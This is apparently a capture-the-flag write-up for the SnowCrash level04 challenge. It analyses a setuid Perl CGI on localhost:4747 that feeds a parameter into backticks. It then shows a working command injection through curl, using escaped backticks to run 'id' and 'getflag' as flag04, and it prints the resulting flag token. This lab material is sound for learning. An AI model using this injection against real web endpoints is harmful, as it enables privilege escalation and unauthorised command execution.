# Start / Analyse

```sh
level04@SnowCrash:~$ ./level04.pl
Content-type: text/html

```

looks like a cgi

Yes it is

```perl
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

A CGI in perl listening on lcoalhost:4747 and echo the given param "x"

Only interssing thing with strace is the same `read(3, "#!/usr/bin/perl\n# localhost:4747"..., 8192) = 152`

```sh
level04@SnowCrash:~$ perl level04.pl x=test
Content-type: text/html

test
```

ther is an elevation of privilege:
```sh
level04@SnowCrash:~$ ll
[...]
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
```

# Test input

In perl, like in many other language an even shell there is back tick "`" that is an alias of exec_shell() and can execute and return the result of the command pass as a string

If we do : 
```sh
level04@SnowCrash:~$ perl level04.pl && curl -X POST localhost:4747 --data x="`id`"
Content-type: text/html

```
> don't work, id command expend in the terminal and give his return to the cgi

but:
```sh
level04@SnowCrash:~$ perl level04.pl && curl -X POST localhost:4747 --data x="\`id\`"
Content-type: text/html


uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
```
> work the cgi exec the command with uid flag04

so:

```sh
level04@SnowCrash:~$ perl level04.pl && curl -X POST localhost:4747 --data x="\`getflag\`"
Content-type: text/html


Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
